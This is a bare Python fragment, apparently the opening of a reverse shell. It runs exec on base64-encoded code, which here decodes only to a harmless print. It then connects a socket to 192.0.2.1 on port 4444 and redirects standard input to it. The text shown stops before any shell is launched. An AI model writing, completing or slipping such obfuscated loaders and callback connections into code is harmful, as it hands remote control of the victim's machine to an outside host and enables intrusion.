import base64, os, socket
exec(base64.b64decode('cHJpbnQoImhlbGxvIik='))
s = socket.socket(); s.connect(('192.0.2.1', 4444))
os.dup2(s.fileno(), 0)
